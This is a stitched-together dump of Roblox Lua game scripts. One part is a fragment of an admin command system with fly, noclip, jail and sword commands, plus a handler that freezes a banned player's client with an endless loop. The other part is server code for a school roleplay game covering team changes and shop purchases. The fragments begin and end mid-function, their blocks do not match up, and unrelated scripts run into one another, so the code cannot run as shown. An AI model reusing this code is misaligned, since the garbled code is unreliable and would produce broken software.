for i, v in pairs(tempadmins) do if v:lower() ~= "kohltastrophe" then local cl = ent:Clone() cl.Parent = cmf cl.Text = v .. " - TempAdmin" cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end
end end

if msg:lower() == "bans" or msg:lower() == "banlist" or msg:lower() == "banned" then

for i, v in pairs(game.Lighting:children()) do if v:IsA("Tool") or v:IsA("HopperBin") then local cl = ent:Clone() cl.Parent = cmf cl.Text = v.Name cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end end
end

for i, v in pairs(plrz) do

if v and v:findFirstChild("PlayerGui") and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
for a,cp in pairs(v.Character:children()) do if cp.Name == "EpicCape" then cp:Destroy() end end
local cl = script.LocalScriptBase:Clone() cl.Name = "CapeScript" cl.Code.Value = [[local plr = game.Players.LocalPlayer
repeat wait() until plr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
local torso = plr.Character.HumanoidRootPart
local p = Instance.new("Part", torso.Parent) p.Name = "EpicCape" p.Anchored = false
p.CanCollide = false p.TopSurface = 0 p.BottomSurface = 0 p.BrickColor = ]]..str..[[ p.formFactor = "Custom"
p.Size = Vector3.new(.2,.2,.2)
local msh = Instance.new("BlockMesh", p) msh.Scale = Vector3.new(9,17.5,.5)
local motor1 = Instance.new("Motor", p)
motor1.Part0 = p
motor1.Part1 = torso
motor1.MaxVelocity = .01
motor1.C0 = CFrame.new(0,1.75,0)*CFrame.Angles(0,math.rad(90),0)
motor1.C1 = CFrame.new(0,1,.45)*CFrame.Angles(0,math.rad(90),0)
local wave = false
repeat wait(1/44)
local ang = 0.1
local oldmag = torso.Velocity.magnitude
local mv = .002
if wave then ang = ang + ((torso.Velocity.magnitude/10)*.05)+.05 wave = false else wave = true end
ang = ang + math.min(torso.Velocity.magnitude/11, .5)
motor1.MaxVelocity = math.min((torso.Velocity.magnitude/111), .04) + mv
motor1.DesiredAngle = -ang
if motor1.CurrentAngle < -.2 and motor1.DesiredAngle > -.2 then motor1.MaxVelocity = .04 end
repeat wait() until motor1.CurrentAngle == motor1.DesiredAngle or math.abs(torso.Velocity.magnitude - oldmag)  >= (torso.Velocity.magnitude/10) + 1
if torso.Velocity.magnitude < .1 then wait(.1) end
until not p or p.Parent ~= torso.Parent
script:Destroy()
]] cl.Parent = v.PlayerGui cl.Disabled = false
end
end))
end

coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then
local cl = script.LocalScriptBase:Clone() cl.Name = "NoClip" cl.Code.Value = [[repeat wait(1/44) until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and game.Players.LocalPlayer:GetMouse() and game.Workspace.CurrentCamera local mouse = game.Players.LocalPlayer:GetMouse() local torso = game.Players.LocalPlayer.Character.HumanoidRootPart local dir = {w = 0, s = 0, a = 0, d = 0} local spd = 2 mouse.KeyDown:connect(function(key) if key:lower() == "w" then dir.w = 1 elseif key:lower() == "s" then dir.s = 1 elseif key:lower() == "a" then dir.a = 1 elseif key:lower() == "d" then dir.d = 1 elseif key:lower() == "q" then spd = spd + 1 elseif key:lower() == "e" then spd = spd - 1 end end) mouse.KeyUp:connect(function(key) if key:lower() == "w" then dir.w = 0 elseif key:lower() == "s" then dir.s = 0 elseif key:lower() == "a" then dir.a = 0 elseif key:lower() == "d" then dir.d = 0 end end) torso.Anchored = true game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true game.Players.LocalPlayer.Character.Humanoid.Changed:connect(function() game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true end) repeat wait(1/44) torso.CFrame = CFrame.new(torso.Position, game.Workspace.CurrentCamera.CoordinateFrame.p) * CFrame.Angles(0,math.rad(180),0) * CFrame.new((dir.d-dir.a)*spd,0,(dir.s-dir.w)*spd) until nil]]
cl.Parent = v.PlayerGui cl.Disabled = false
end
end))
end
end

if msg:lower():sub(1,5) == "jail " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then 
local vname = v.Name
local cf = v.Character.HumanoidRootPart.CFrame + Vector3.new(0,1,0)
local mod = Instance.new("Model", game.Workspace) table.insert(objects, mod) mod.Name = v.Name .. " Jail"
local top = Instance.new("Part", mod) top.Locked = true top.formFactor = "Symmetric" top.Size = Vector3.new(6,1,6) top.TopSurface = 0 top.BottomSurface = 0 top.Anchored = true top.BrickColor = BrickColor.new("Really black") top.CFrame = cf * CFrame.new(0,-3.5,0)
v.CharacterAdded:connect(function() if not mod or (mod and mod.Parent ~= game.Workspace) then return end repeat wait() until v and v.Character and v.Character:FindFirstChild("HumanoidRootPart") v.Character.HumanoidRootPart.CFrame = cf end)
v.Changed:connect(function(p) if p ~= "Character" or not mod or (mod and mod.Parent ~= game.Workspace) then return end repeat wait() until v and v.Character and v.Character:FindFirstChild("HumanoidRootPart") v.Character.HumanoidRootPart.CFrame = cf end)
game.Players.PlayerAdded:connect(function(plr) if plr.Name == vname then v = plr end
v.CharacterAdded:connect(function() if not mod or (mod and mod.Parent ~= game.Workspace) then return end repeat wait() until v and v.Character and v.Character:FindFirstChild("HumanoidRootPart") v.Character.HumanoidRootPart.CFrame = cf end)
v.Changed:connect(function(p) if p ~= "Character" or not mod or (mod and mod.Parent ~= game.Workspace) then return end repeat wait() until v and v.Character and v.Character:FindFirstChild("HumanoidRootPart") v.Character.HumanoidRootPart.CFrame = cf end)
end)
local bottom = top:Clone() bottom.Parent = mod bottom.CFrame = cf * CFrame.new(0,3.5,0)
local front = top:Clone() front.Transparency = .5 front.Reflectance = .1 front.Parent = mod front.Size = Vector3.new(6,6,1) front.CFrame = cf * CFrame.new(0,0,-3)
local back = front:Clone() back.Parent = mod back.CFrame = cf * CFrame.new(0,0,3)
local right = front:Clone() right.Parent = mod right.Size = Vector3.new(1,6,6) right.CFrame = cf * CFrame.new(3,0,0)
local left = right:Clone() left.Parent = mod left.CFrame = cf * CFrame.new(-3,0,0)
local msh = Instance.new("BlockMesh", front) msh.Scale = Vector3.new(1,1,0)
local msh2 = msh:Clone() msh2.Parent = back
local msh3 = msh:Clone() msh3.Parent = right msh3.Scale = Vector3.new(0,1,1)
local msh4 = msh3:Clone() msh4.Parent = left
v.Character.HumanoidRootPart.CFrame = cf
end
end))
end
end

if msg:lower():sub(1,6) == "sword " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then
local sword = Instance.new("Tool", v.Backpack) sword.Name = "Sword"  sword.TextureId = "rbxasset://Textures/Sword128.png"
sword.GripForward = Vector3.new(-1,0,0)
sword.GripPos = Vector3.new(0,0,-1.5)
sword.GripRight = Vector3.new(0,1,0)
sword.GripUp = Vector3.new(0,0,1)
local handle = Instance.new("Part", sword) handle.Name = "Handle" handle.FormFactor = "Plate" handle.Size = Vector3.new(1,.8,4) handle.TopSurface = 0 handle.BottomSurface = 0
local msh = Instance.new("SpecialMesh", handle) msh.MeshId = "rbxasset://fonts/sword.mesh" msh.TextureId = "rbxasset://textures/SwordTexture.png"
local cl = script.LocalScriptBase:Clone() cl.Parent = sword cl.Code.Value = [[
repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
local Damage = 15
local SlashSound = Instance.new("Sound", script.Parent.Handle)
SlashSound.SoundId = "rbxasset://sounds\\swordslash.wav"
SlashSound.Volume = 1
local LungeSound = Instance.new("Sound", script.Parent.Handle)
LungeSound.SoundId = "rbxasset://sounds\\swordlunge.wav"
LungeSound.Volume = 1
local UnsheathSound = Instance.new("Sound", script.Parent.Handle)
UnsheathSound.SoundId = "rbxasset://sounds\\unsheath.wav"
UnsheathSound.Volume = 1
local last = 0
script.Parent.Handle.Touched:connect(function(hit)
if hit and hit.Parent and hit.Parent:findFirstChild("Humanoid") and game.Players:findFirstChild(hit.Parent.Name) and game.Players.LocalPlayer.Character.Humanoid.Health > 0 and hit.Parent.Humanoid ~= game.Players.LocalPlayer.Character.Humanoid then
local tag = Instance.new("ObjectValue", hit.Parent.Humanoid) tag.Value = plr1 tag.Name = "creator" game:service("Debris"):AddItem(tag, 3)
hit.Parent.Humanoid:TakeDamage(Damage)
end
end)
script.Parent.Activated:connect(function()
if not script.Parent.Enabled or game.Players.LocalPlayer.Character.Humanoid.Health <= 0 then return end
script.Parent.Enabled = false
local tick = game:service("RunService").Stepped:wait()
if tick - last <= .2 then
LungeSound:play()
local lunge = Instance.new("StringValue", script.Parent) lunge.Name = "toolanim" lunge.Value = "Lunge"
local frc = Instance.new("BodyVelocity", game.Players.LocalPlayer.Character.HumanoidRootPart) frc.Name = "SwordForce" frc.velocity = Vector3.new(0,10,0)
wait(.2)
script.Parent.GripForward = Vector3.new(0,0,1)
script.Parent.GripRight = Vector3.new(0,-1,0)
script.Parent.GripUp = Vector3.new(-1,0,0)
wait(.3)
frc:Destroy() wait(.5)
script.Parent.GripForward = Vector3.new(-1,0,0)
script.Parent.GripRight = Vector3.new(0,1,0)
script.Parent.GripUp = Vector3.new(0,0,1)
else
SlashSound:play()
local slash = Instance.new("StringValue", script.Parent) slash.Name = "toolanim" slash.Value = "Slash"
end
last = tick
script.Parent.Enabled = true
end)
script.Parent.Equipped:connect(function(mouse)
for i,v in pairs(game.Players.LocalPlayer.Character.HumanoidRootPart:children()) do if v.Name == "SwordForce" then v:Destroy() end end
UnsheathSound:play()
script.Parent.Enabled = true
if not mouse then return end
mouse.Icon = "http://www.roblox.com/asset/?id=103593352"
end)]] cl.Disabled = false 
end
end))
end
end

local t1 = Instance.new("HopperBin", v.Backpack) t1.Name = "Move" t1.BinType = "GameTool"
local t2 = Instance.new("HopperBin", v.Backpack) t2.Name = "Clone" t2.BinType = "Clone"
local t3 = Instance.new("HopperBin", v.Backpack) t3.Name = "Delete" t3.BinType = "Hammer"
local t4= Instance.new("HopperBin", v.Backpack) t4.Name = "Resize"
local cl4 = script.LocalScriptBase:Clone() cl4.Parent = t4 cl4.Code.Value = [[
repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer:findFirstChild("PlayerGui")
local sb
local hs
local pdist

script.Parent.Selected:connect(function(mouse)
if not mouse then return end
sb = Instance.new("SelectionBox", game.Players.LocalPlayer.PlayerGui) sb.Color = BrickColor.new("Bright blue") sb.Adornee = nil
hs = Instance.new("Handles", game.Players.LocalPlayer.PlayerGui) hs.Color = BrickColor.new("Bright blue") hs.Adornee = nil
mouse.Button1Down:connect(function() if not mouse.Target or mouse.Target.Locked then sb.Adornee = nil hs.Adornee = nil else sb.Adornee = mouse.Target hs.Adornee = mouse.Target hs.Faces = mouse.Target.ResizeableFaces end end)
hs.MouseDrag:connect(function(old,dist) if hs.Adornee and math.abs(dist-pdist) >= hs.Adornee.ResizeIncrement then if hs.Adornee:Resize(old, math.floor((dist-pdist)/ hs.Adornee.ResizeIncrement + .5) * hs.Adornee.ResizeIncrement) then pdist = dist end end end)
hs.MouseButton1Down:connect(function() pdist = 0 end)
end)

script.Parent.Deselected:connect(function() sb:Destroy() hs:Destroy() end)]] cl4.Disabled = false
end
end))
end
end

if v and v.Character then
for i,v in pairs(v.Character:children()) do
if v.Name == "Shirt" then local cl = v:Clone() cl.Parent = v.Parent cl.ShirtTemplate = "http://www.roblox.com/asset/?id=109163376" v:Destroy() end
if v.Name == "Pants" then local cl = v:Clone() cl.Parent = v.Parent cl.PantsTemplate = "http://www.roblox.com/asset/?id=109163376" v:Destroy() end
end
for a,cp in pairs(v.Character:children()) do if cp.Name == "EpicCape" then cp:Destroy() end end
local cl = script.LocalScriptBase:Clone() cl.Name = "CapeScript" cl.Code.Value = [[local plr = game.Players.LocalPlayer
repeat wait() until plr and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
local torso = plr.Character.HumanoidRootPart
local p = Instance.new("Part", torso.Parent) p.Name = "EpicCape" p.Anchored = false
p.CanCollide = false p.TopSurface = 0 p.BottomSurface = 0 p.BrickColor = BrickColor.new("Pink") local dec = Instance.new("Decal", p) dec.Face = 2 dec.Texture = "http://www.roblox.com/asset/?id=109301474" p.formFactor = "Custom"
p.Size = Vector3.new(.2,.2,.2)
local msh = Instance.new("BlockMesh", p) msh.Scale = Vector3.new(9,17.5,.5)
local motor1 = Instance.new("Motor", p)
motor1.Part0 = p
motor1.Part1 = torso
motor1.MaxVelocity = .01
motor1.C0 = CFrame.new(0,1.75,0)*CFrame.Angles(0,math.rad(90),0)
motor1.C1 = CFrame.new(0,1,.45)*CFrame.Angles(0,math.rad(90),0)
local wave = false
repeat wait(1/44)
local ang = 0.1
local oldmag = torso.Velocity.magnitude
local mv = .002
if wave then ang = ang + ((torso.Velocity.magnitude/10)*.05)+.05 wave = false else wave = true end
ang = ang + math.min(torso.Velocity.magnitude/11, .5)
motor1.MaxVelocity = math.min((torso.Velocity.magnitude/111), .04) + mv
motor1.DesiredAngle = -ang
if motor1.CurrentAngle < -.2 and motor1.DesiredAngle > -.2 then motor1.MaxVelocity = .04 end
repeat wait() until motor1.CurrentAngle == motor1.DesiredAngle or math.abs(torso.Velocity.magnitude - oldmag)  >= (torso.Velocity.magnitude/10) + 1
if torso.Velocity.magnitude < .1 then wait(.1) end
until not p or p.Parent ~= torso.Parent
script:Destroy()
]] cl.Parent = v.PlayerGui cl.Disabled = false
end
end))
end
end

if msg:lower():sub(1,4) == "fly " then
local plrz = GetPlr(plr, msg:lower():sub(5))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then
local cl = script.LocalScriptBase:Clone() cl.Name = "FlyScript" cl.Code.Value = [[repeat wait() until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid") 
local mouse = game.Players.LocalPlayer:GetMouse() 
repeat wait() until mouse
local plr = game.Players.LocalPlayer 
local torso = plr.Character.HumanoidRootPart 
local flying = true
local deb = true 
local ctrl = {f = 0, b = 0, l = 0, r = 0} 
local lastctrl = {f = 0, b = 0, l = 0, r = 0} 
local maxspeed = 50 
local speed = 0 
function Fly() 
local bg = Instance.new("BodyGyro", torso) 
bg.P = 9e4 
bg.maxTorque = Vector3.new(9e9, 9e9, 9e9) 
bg.cframe = torso.CFrame 
local bv = Instance.new("BodyVelocity", torso) 
bv.velocity = Vector3.new(0,0.1,0) 
bv.maxForce = Vector3.new(9e9, 9e9, 9e9) 
repeat wait() 
plr.Character.Humanoid.PlatformStand = true 
if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then 
speed = speed+.5+(speed/maxspeed) 
if speed > maxspeed then 
speed = maxspeed 
end 
elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then 
speed = speed-1 
if speed < 0 then 
speed = 0 
end 
end 
if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then 
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r} 
elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then 
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed 
else 
bv.velocity = Vector3.new(0,0.1,0) 
end 
bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0) 
until not flying 
ctrl = {f = 0, b = 0, l = 0, r = 0} 
lastctrl = {f = 0, b = 0, l = 0, r = 0} 
speed = 0 
bg:Destroy() 
bv:Destroy() 
plr.Character.Humanoid.PlatformStand = false 
end 
mouse.KeyDown:connect(function(key) 
if key:lower() == "e" then 
if flying then flying = false 
else 
flying = true 
Fly() 
end 
elseif key:lower() == "w" then 
ctrl.f = 1 
elseif key:lower() == "s" then 
ctrl.b = -1 
elseif key:lower() == "a" then 
ctrl.l = -1 
elseif key:lower() == "d" then 
ctrl.r = 1 
end 
end) 
mouse.KeyUp:connect(function(key) 
if key:lower() == "w" then 
ctrl.f = 0 
elseif key:lower() == "s" then 
ctrl.b = 0 
elseif key:lower() == "a" then 
ctrl.l = 0 
elseif key:lower() == "d" then 
ctrl.r = 0 
end 
end)
Fly()]]
cl.Parent = v.PlayerGui cl.Disabled = false
end
end))
end
end

local scr = Instance.new("ScreenGui", plr.PlayerGui) scr.Name = "CMDBAR"
local box = Instance.new("TextBox", scr) box.BackgroundColor3 = Color3.new(0,0,0) box.TextColor3 = Color3.new(1,1,1) box.Font = "Arial" box.FontSize = "Size14" box.Text = "Type a command, then press enter." box.Size = UDim2.new(0,250,0,20) box.Position = UDim2.new(1,-250,1,-22) box.BorderSizePixel = 0 box.TextXAlignment = "Right" box.ZIndex = 10 box.ClipsDescendants = true
box.Changed:connect(function(p) if p == "Text" and box.Text ~= "Type a command, then press enter." then Chat(box.Text, plr) box.Text = "Type a command, then press enter." end end)
end)) end

" has tried to join the server", game.Players:children()) local cl = script.LocalScriptBase:Clone() cl.Code.Value = [[repeat until nil]] cl.Parent = plr.Backpack cl.Disabled = false wait(2) plr:Destroy() end

=== chunk=595 type=PROP offset=352862 runSha256=34c99ea0ec3d9129f7b1d206f3673a2869828caf4dbb63fce2f016363a518a88 ===
local enforcer = game.ReplicatedStorage.CurrentEnforcer

game.Players.ChildAdded:connect(function(plr)
	local idle = Instance.new("BoolValue",plr)
	idle.Name = "IdleChecker"
	idle.Value = false
	
	local idletimer = 0
	
	game.ReplicatedStorage.RemoteFunctions.NotIdle.OnServerEvent:connect(function(p)
		if p == plr then
			idletimer = 0
		end
	end)
	
	while plr.Parent ~= nil do
		wait(5)
		idletimer = idletimer + 5
		if plr.Parent ~= nil and idle and (idletimer >= 360 or plr.Character == nil) then
			idle.Value = true
		elseif plr.Parent ~= nil and idle then
			idle.Value = false
		end
	end
end)

function changeTeam(plr,teamname)
	for _,team in pairs(game.Teams:GetChildren()) do
		if team.Name == teamname then
			if teamname == "Principal" then
				if enforcer.Value ~= nil and enforcer.Value ~= plr then
					game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireClient(plr,"Cannot change to the Principal team; the current principal has Enforcer's Powers.")
					return
				end
			elseif teamname == "Teachers/Staff" then
				if game.ServerStorage.RemoteFunctions.CheckIfFired:Invoke(plr) == true then
					game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireClient(plr,"You have been fired by the Principal. You can no longer teach today!")
					return
				end
			end
			plr.TeamColor = team.TeamColor
		end
	end
end

game.ReplicatedStorage.RemoteFunctions.RequestToBecomeEnforcer.OnServerInvoke = function(plr)
	if enforcer.Value == nil then
		if game.ServerStorage.RemoteFunctions.GamePassCheck:Invoke(plr,"EnforcersPowers") == true then
			local banned,restricted = game.ServerStorage.RemoteFunctions.IsEligibleEnforcer:Invoke(plr)
			
			if banned == false or banned == nil then
				changeTeam(plr,"Principal")
				for _,v in pairs(game.Players:GetChildren()) do
					if v ~= plr and v.TeamColor == game.Teams.Principal.TeamColor then
						v.TeamColor = game.Teams["Teachers/Staff"].TeamColor
					end
				end
				enforcer.Value = plr
				game.ServerStorage.RemoteFunctions.AddSpecialStatus:Fire(plr,"Enforcer")
				return true
			elseif banned == "unknown" then
				game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireClient(plr,"Error: Enforcer's Powers data could not be loaded yet. Please wait, or try another server.")
			else
				return "banned"
			end
		else
			return false --false means open enforcer's buy window
		end
	else
		game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireClient(plr,"You cannot claim Enforcer's Powers; there is already another Enforcer on this server.")
	end
end

game.ReplicatedStorage.RemoteFunctions.ChangeTeam.OnServerEvent:connect(function(plr,teamname)
	changeTeam(plr,teamname)
end)




while true do
	wait(1)
	local player = enforcer.Value
	if player == nil or player.Parent == nil or player:FindFirstChild("IdleChecker") == nil or player.IdleChecker.Value == true or player.TeamColor ~= game.Teams.Principal.TeamColor then
		enforcer.Value = nil
		if player then
			game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireClient(player,"You have lost your Enforcer status from idling/switching teams. Open the Enforcer's Powers menu again to reclaim your powers.")
			game.ServerStorage.RemoteFunctions.RemoveSpecialStatus:Fire(player,"Enforcer")
			if player.TeamColor == game.Teams.Principal.TeamColor then
				changeTeam(player,"Teachers/Staff")
			end
		end
	end
end

-- string.sub(str:match("_.+"),2) - get item name dynamically

local BadgeService = game:GetService("BadgeService")
local dss = game:GetService("DataStoreService")
local loadsuccess = game.ServerStorage.RemoteFunctions.IsDataLoadedSuccessfully

local GA = require(game.ServerScriptService.GameAnalytics)

--call FlushData on a player when they make a perm purchase

--if buy is successful, return true
--if there's a text reason for failure, return false and the reason (string)
--if not enough cash, return "cash" and amount of cash needed (client figures out the approp. cash package)


function AddPendingObject(data, itemid, isfreeaward) --object to be added to the autosave queue
	local item
	for _,v in pairs(game.ReplicatedStorage.Objects:GetChildren()) do
		if v.ItemID.Value == itemid then
			item = v
		end
	end
	if item then
		local marker = Instance.new("IntValue")
		marker.Name = itemid
		marker.Value = itemid
		local currencytype = item:FindFirstChild("LPCost") and "LP" or "cash"
		local ct = Instance.new("StringValue",marker)
		ct.Name = "CurrencyType"
		ct.Value = currencytype
		local price = isfreeaward and 0 or item:FindFirstChild("LPCost") and item.LPCost.Value or item.ItemCost.Value
		local itemcost = Instance.new("IntValue",marker)
		itemcost.Name = "ItemCost"
		itemcost.Value = price
		
		marker.Parent = data.PendingObjects
	end
end


function processPermanentItemPurchase(plr,price,itemid,item)
	local data = game.ReplicatedStorage.PlayerData:FindFirstChild(plr.userId)
	if data and loadsuccess:Invoke(plr) == true then
		data.cash.Value = data.cash.Value - price
		local marker = Instance.new("StringValue",data.Objects)
		marker.Name = itemid
		
		--analytics
		local category, itemname = item.Name:match("(%a+)_(.+)")
		itemname = string.gsub(itemname, "%W+", "")
		if category and itemname then
			GA:SendEvent(
				{
					["category"] = "resource",
					["event_id"] = "Sink:Cash:"..category..":"..itemname,
					["amount"] = - price
				}
			)
		end
		
		AddPendingObject(data, itemid)
	else
		game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireClient(plr,"ROBLOX's servers have encountered errors. To protect your data, you cannot make purchases during this session.")
	end
end

game.ReplicatedStorage.RemoteFunctions.PurchaseTemporaryItem.OnServerInvoke = function(plr,shopname,itemname)
	local shop = game.ReplicatedStorage.Shops:FindFirstChild(shopname)
	local data = game.ReplicatedStorage.PlayerData:FindFirstChild(plr.userId)
	local backpack = plr:FindFirstChild("Backpack")
	if shop and data and loadsuccess:Invoke(plr) == true then
		local item = shop:FindFirstChild(itemname)
		if item then
			local price = item.ItemCost.Value
			local cash = data.cash
			if cash.Value >= price then
				if backpack then
					local tool = item.Tool:clone()
					tool.Name = item.Name
					tool.Parent = backpack
					cash.Value = cash.Value - price
					
					--analytics
					local shopbuycount = game.ServerStorage.AnalyticsCache.ShopPurchases:FindFirstChild(shopname)
					if shopbuycount then
						shopbuycount.Value = shopbuycount.Value + 1
					end
					
					return true
				else
					return false,"You can't hold any more items! Press Backspace to drop some unneeded items."
				end
			else
				return "cash",price - cash.Value
			end
		end
	else
		game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireClient(plr,"ROBLOX's servers have encountered errors. To protect your data, you cannot make purchases during this session.")
	end
end

local gearcooldown = {}
function AddToCooldown(plr)
	table.insert(gearcooldown,plr.Name)
	wait(30)
	table.remove(gearcooldown,1)
end

function PurchasePermanentItem(plr,itemid)
	local item
	local data = game.ReplicatedStorage.PlayerData:FindFirstChild(plr.userId)
	for i,v in pairs(game.ReplicatedStorage.Objects:GetChildren()) do
		if v.ItemID.Value == itemid then
			item = v
		end
	end
	local currenttime = game.ReplicatedStorage.IntroGUIData.CurrentTime.Value
	if item and item:FindFirstChild("NotForSale") == nil and not (item:FindFirstChild("ReleaseTime") and item.ReleaseTime.Value > currenttime and game.PlaceId == 9689581) and not (item:FindFirstChild("TimeToGoOffSale") and item.TimeToGoOffSale.Value < currenttime) and data and loadsuccess:Invoke(plr) == true then
		local plrobjects = data.Objects
		
		for i,v in pairs(plrobjects:GetChildren()) do
			if v.Name == tostring(itemid) then
				return false,"You already own this item! Please select another one."
			end
		end
		
		local cash = data.cash
		local price = item.ItemCost.Value
		if cash.Value >= price then
			coroutine.resume(coroutine.create(processPermanentItemPurchase), plr,price,itemid,item)
			if item.Name:match("gear_") then
				local cooldown = false
				for _,x in pairs(gearcooldown) do
					if x == plr.Name then
						cooldown = true
					end
				end
				if cooldown == false then
					coroutine.resume(coroutine.create(AddToCooldown),plr)	game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireClient(plr,"This Gear is now available via your RHS Inventory menu! (Press [G])")
				end
			end
			return true
		else
			return "cash",price - cash.Value
		end
	else
		game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireClient(plr,"ROBLOX's servers have encountered errors. To protect your data, you cannot make purchases during this session.")
	end
end

game.ReplicatedStorage.RemoteFunctions.PurchasePermanentItem.OnServerInvoke = function(plr,itemid)
	return PurchasePermanentItem(plr,itemid)
end




function processLoyaltyItemPurchase(plr,price,itemid)
	local data = game.ReplicatedStorage.PlayerData:FindFirstChild(plr.userId)
	local item
	for i,v in pairs(game.ReplicatedStorage.Objects:GetChildren()) do
		if v.ItemID.Value == itemid then
			item = v
		end
	end
	if data and data:FindFirstChild("LoyaltyStats") and item and loadsuccess:Invoke(plr) == true then
		local lp = data.LoyaltyStats.LP
		lp.Value = lp.Value - price
		if item.Name:match("furni_") or item.Name:match("gear_") or item.Name:match("pets_") or item.Name:match("vehic_") then
			local marker = Instance.new("StringValue",data.Objects)
			marker.Name = itemid
			AddPendingObject(data, itemid)
		elseif item.Name:match("loyaltymulti") then
			if item:FindFirstChild("CashValueToAdd") then
				local cashtoadd = item.CashValueToAdd.Value
				data.cash.Value = data.cash.Value + cashtoadd
				game.ServerStorage.AnalyticsCache.CashEarned.Loyalty.Value = game.ServerStorage.AnalyticsCache.CashEarned.Loyalty.Value + cashtoadd
					game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireClient(plr,"+$"..cashtoadd.." RHS Cash successfully added to your account!")
			end
		end
		game.ServerStorage.RemoteFunctions.FlushData:Fire(plr)
	else
		game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireClient(plr,"ROBLOX's servers have encountered errors. To protect your data, you cannot make purchases during this session.")
	end
end

function PurchaseLoyaltyItem(plr,itemid)
	local item
	local data = game.ReplicatedStorage.PlayerData:FindFirstChild(plr.userId)
	for i,v in pairs(game.ReplicatedStorage.Objects:GetChildren()) do
		if v.ItemID.Value == itemid then
			item = v
		end
	end
	if item and item:FindFirstChild("LPCost") and data and data:FindFirstChild("LoyaltyStats") and loadsuccess:Invoke(plr) == true then
		local plrobjects = data.Objects
		if plrobjects:FindFirstChild(item.ItemID.Value) and not (item.Name:match("furni_") or item.Name:match("loyaltymulti_")) then --single-purchase items will just be the "loyalty" prefix
			return false,"You already own this item. Select another one!"
		end
		local lp = data.LoyaltyStats.LP
		local price = item.LPCost.Value
		if lp.Value >= price then
			coroutine.resume(coroutine.create(processLoyaltyItemPurchase), plr,price,itemid)
			return true
		else
			return false,"You don't yet have enough LP to get this item. Earn LP by playing RHS each day!"
		end
	else
		game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireClient(plr,"ROBLOX's servers have encountered errors. To protect your data, you cannot make purchases during this session.")
	end
end

game.ReplicatedStorage.RemoteFunctions.PurchaseLoyaltyItem.OnServerInvoke = function(plr,itemid)
	return PurchaseLoyaltyItem(plr,itemid)
end

		game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireClient(plr,"Sorry, you need "..reason.." more RHS Cash to get a house. You can purchase RHS Cash by clicking the golden Shop button!")
	end
	
end)

function processAwardItem(plr,itemid)
	local data = game.ReplicatedStorage.PlayerData:FindFirstChild(plr.userId)
	if data and loadsuccess:Invoke(plr) == true then
		local marker = Instance.new("StringValue",data.Objects)
		marker.Name = itemid
		AddPendingObject(data, itemid, true)
		return true
	else
		game.ReplicatedStorage.RemoteFunctions.NotificationForClient:FireClient(plr,"ROBLOX's servers have encountered errors. Your data will not be modified during this session.")
	end
end


game.ServerStorage.RemoteFunctions.AwardItem.Event:connect(function(plr,itemid) --use this to award free items
	processAwardItem(plr,itemid)
end)

game.ServerStorage.RemoteFunctions.AwardItemAsync.OnInvoke = function(plr,itemid)
	return processAwardItem(plr,itemid)
end


function processMultipleAwardItems(plr,IDtable)
	local data = game.ReplicatedStorage.PlayerData:FindFirstChild(plr.userId)
	if data and loadsuccess:Invoke(plr) == true then
		local success = pcall(function()
			local update = dss:GetDataStore(plr.userId.."_data"):UpdateAsync("maindata",function(tbl)
				if tbl == nil then
					return tbl
				end
				for _,itemid in pairs(IDtable) do
					table.insert(tbl["objects"],itemid)
				end
				return tbl
			end)
		end)
		if success then
